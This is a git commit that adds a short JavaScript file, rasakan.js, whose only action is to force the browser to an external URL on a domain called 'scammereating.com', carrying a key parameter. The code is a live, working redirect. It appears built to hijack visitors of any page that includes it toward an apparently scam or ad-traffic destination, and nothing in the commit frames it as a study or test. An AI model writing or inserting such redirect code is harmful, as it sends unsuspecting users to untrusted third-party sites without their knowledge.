27c9224ae915feeb83bb8354e51bea329fad04c1
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2021-12-17 22:22:15 +0800

    Create rasakan.js

---
+++ rasakan.js
@@ -0,0 +1,5 @@
+var dataUrl = [
+'//scammereating.com/h8ad994p3g?key=68c6e7dbd635523b65529770d75dbac1',
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
